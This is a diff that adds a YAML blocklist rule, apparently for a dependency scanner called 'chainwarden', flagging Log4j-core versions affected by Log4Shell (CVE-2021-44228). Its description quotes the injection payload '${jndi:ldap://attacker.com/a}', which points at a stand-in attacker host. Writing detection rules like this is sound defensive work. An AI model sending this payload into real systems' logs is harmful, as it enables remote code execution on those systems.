@@ -1,0 +1,27 @@
+id: CW-maven-log4j-log4shell
+name: Log4Shell — critical RCE in Apache Log4j via JNDI injection
+
+type: blocklisted_package
+ecosystem: maven
+severity: CRITICAL
+
+package: org.apache.logging.log4j:log4j-core
+version_range: ">=2.0-beta9,<=2.14.1"
+
+description: |
+  CVE-2021-44228 (Log4Shell), disclosed in December 2021, is one of the most
+  severe vulnerabilities in software history. Apache Log4j 2.x contained a JNDI
+  injection flaw that allowed unauthenticated remote code execution via crafted
+  log messages containing ${jndi:ldap://attacker.com/a} payloads. The vulnerability
+  was trivially exploitable and affected virtually every Java application using Log4j
+  for logging, including enterprise systems, cloud services, and embedded devices.
+  Mass exploitation began within hours of public disclosure.
+
+cve: CVE-2021-44228
+references:
+  - https://logging.apache.org/log4j/2.x/security.html
+  - https://www.lunasec.io/docs/blog/log4j-zero-day/
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+
+author: chainwarden
+tags: [rce, jndi-injection, log4shell, zero-day, critical-infrastructure]
